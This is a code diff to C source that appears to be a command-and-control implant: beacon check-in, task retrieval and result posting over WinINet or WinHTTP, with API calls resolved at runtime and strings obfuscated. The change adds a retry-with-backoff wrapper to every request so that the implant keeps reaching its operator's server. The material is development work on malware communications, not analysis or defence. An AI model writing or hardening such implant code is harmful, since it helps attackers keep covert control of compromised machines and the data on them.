@@ -149,23 +149,38 @@ static void build_path(const char* uri, char* out, int out_size) {
         out[offset + i] = uri[i];
 }
 
+// Retry wrapper: 3 attempts with escalating backoff (0ms, 500ms, 1500ms).
+// On failure, the last error state is returned.
+static BOOL _http_request_retry(PINSTANCE inst, LPCSTR verb, LPCSTR path,
+                                BYTE* body, DWORD body_len,
+                                BYTE** response, DWORD* resp_len) {
+    static const DWORD backoff_ms[] = { 0, 500, 1500 };
+    for (int attempt = 0; attempt < 3; attempt++) {
+        if (backoff_ms[attempt] > 0)
+            inst->Win32.Sleep(backoff_ms[attempt]);
+        if (_http_request(inst, verb, path, body, body_len, response, resp_len))
+            return TRUE;
+    }
+    return FALSE;
+}
+
 BOOL http_checkin(PINSTANCE inst) {
     char path[256] = {0};
     build_path(inst->Http.get_uri, path, 256);
-    return _http_request(inst, "GET", path, NULL, 0, NULL, NULL);
+    return _http_request_retry(inst, "GET", path, NULL, 0, NULL, NULL);
 }
 
 BOOL http_get_tasks(PINSTANCE inst, BYTE** tasks, DWORD* tasks_len) {
     char path[256] = {0};
     build_path(inst->Http.get_uri, path, 256);
-    return _http_request(inst, "GET", path, NULL, 0, tasks, tasks_len);
+    return _http_request_retry(inst, "GET", path, NULL, 0, tasks, tasks_len);
 }
 
 BOOL http_post_response(PINSTANCE inst, BYTE* data, DWORD data_len,
                         BYTE** response, DWORD* resp_len) {
     char path[256] = {0};
     build_path(inst->Http.post_uri, path, 256);
-    return _http_request(inst, "POST", path, data, data_len, response, resp_len);
+    return _http_request_retry(inst, "POST", path, data, data_len, response, resp_len);
 }
 
 #else // USE_WINHTTP
@@ -289,23 +304,37 @@ static void build_path(PINSTANCE inst, const char* uri, wchar_t* wpath, int wpat
     inst->Win32.MultiByteToWideChar(CP_ACP, 0, path, -1, wpath, wpath_size);
 }
 
+// Retry wrapper: 3 attempts with escalating backoff (0ms, 500ms, 1500ms).
+static BOOL _http_request_retry(PINSTANCE inst, LPCWSTR verb, LPCWSTR path,
+                                BYTE* body, DWORD body_len,
+                                BYTE** response, DWORD* resp_len) {
+    static const DWORD backoff_ms[] = { 0, 500, 1500 };
+    for (int attempt = 0; attempt < 3; attempt++) {
+        if (backoff_ms[attempt] > 0)
+            inst->Win32.Sleep(backoff_ms[attempt]);
+        if (_http_request(inst, verb, path, body, body_len, response, resp_len))
+            return TRUE;
+    }
+    return FALSE;
+}
+
 BOOL http_checkin(PINSTANCE inst) {
     wchar_t wpath[256] = {0};
     build_path(inst, inst->Http.get_uri, wpath, 256);
-    return _http_request(inst, XWSTR(L"GET"), wpath, NULL, 0, NULL, NULL);
+    return _http_request_retry(inst, XWSTR(L"GET"), wpath, NULL, 0, NULL, NULL);
 }
 
 BOOL http_get_tasks(PINSTANCE inst, BYTE** tasks, DWORD* tasks_len) {
     wchar_t wpath[256] = {0};
     build_path(inst, inst->Http.get_uri, wpath, 256);
-    return _http_request(inst, XWSTR(L"GET"), wpath, NULL, 0, tasks, tasks_len);
+    return _http_request_retry(inst, XWSTR(L"GET"), wpath, NULL, 0, tasks, tasks_len);
 }
 
 BOOL http_post_response(PINSTANCE inst, BYTE* data, DWORD data_len,
                         BYTE** response, DWORD* resp_len) {
     wchar_t wpath[256] = {0};
     build_path(inst, inst->Http.post_uri, wpath, 256);
-    return _http_request(inst, XWSTR(L"POST"), wpath, data, data_len, response, resp_len);
+    return _http_request_retry(inst, XWSTR(L"POST"), wpath, data, data_len, response, resp_len);
 }
 
 #endif // USE_WININET / USE_WINHTTP
